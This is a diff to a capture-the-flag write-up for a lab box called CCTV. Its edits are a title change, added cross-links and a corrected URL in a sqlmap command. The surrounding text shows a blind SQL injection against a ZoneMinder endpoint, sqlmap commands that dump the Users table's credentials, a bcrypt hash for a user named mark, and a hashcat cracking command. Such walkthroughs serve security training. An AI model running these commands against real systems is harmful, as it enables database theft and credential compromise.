@@ -1,5 +1,5 @@
 
-# Box Name
+# CCTV
 
 ## Box Info
 
@@ -47,6 +47,8 @@ The plan here is to deploy the payload via `sqlmap` and hunt down the database c
 
 For every character it basically says "`IF` character > 'M' `SLEEP` for 1 second". And it continues until it finds the correct character.
 
+See Also: [[SQLmap]] | [[Hash-Cracking]]
+
 ### Steps
 
 1: Discover the names of the available databases.
@@ -77,6 +79,8 @@ mark: `$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.`
 ---
 
 ## Privilege Escalation
+
+See Also: [[Linux-Privilege-Escalation]] | [[Credential-Hunting]] | [[tcpdump]] | [[Shells]]
 
 ### Enumeration
 
@@ -219,7 +223,7 @@ sqlmap --cookie="ZMSESSID=<SESSION>" \
   -D zm --tables --batch
 
 sqlmap --cookie="ZMSESSID=<SESSION>" \
-  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetam&tid=1' \
+  -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1' \
   -D zm -T Users -C Username,Password --dump --batch --threads=10 --hex
 
 hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
